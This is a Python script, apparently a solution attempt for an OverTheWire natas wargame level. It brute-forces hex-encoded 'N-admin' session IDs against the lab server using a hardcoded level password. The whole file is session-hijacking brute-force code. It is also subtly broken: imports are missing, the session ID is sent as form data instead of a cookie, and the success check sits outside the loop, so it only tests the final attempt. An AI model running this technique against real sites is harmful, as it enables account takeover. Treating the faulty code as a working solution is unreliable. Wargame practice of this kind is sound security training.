chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
password = []
search = True
sessionid_list = []

def get_random_alphanumeric_string(length):
    letters_and_digits = string.ascii_lowercase + string.digits
    result_str = ''.join((random.choice(letters_and_digits) for i in range(length)))
    return(result_str)

Data1 = {'username' : 'admin', 'PHPSESSID' : '3136312d61646d696e' }

a = requests.post('http://natas18.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), data = Data1)
a_len = len(a.content)




while search == True:
    
    for i in range(650):
        num = str(i)
        sessionid = num + '-admin'
        sessionid = sessionid.encode('utf-8')
        sessionidhex = binascii.b2a_hex(sessionid)
        sessionidhex = sessionidhex.decode('utf-8')
        Data = {'username' : 'admin', 'PHPSESSID' : sessionidhex }
        r = requests.post('http://natas18.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), data = Data)
        length = len(r.content)
        #print(f'testing session id:  {sessionid} , hex: {sessionidhex} ')
        #print(Data)
    if length > a_len:
            password.append(sessionid)
            search = False
            print('this is the answer', sessionid)

        
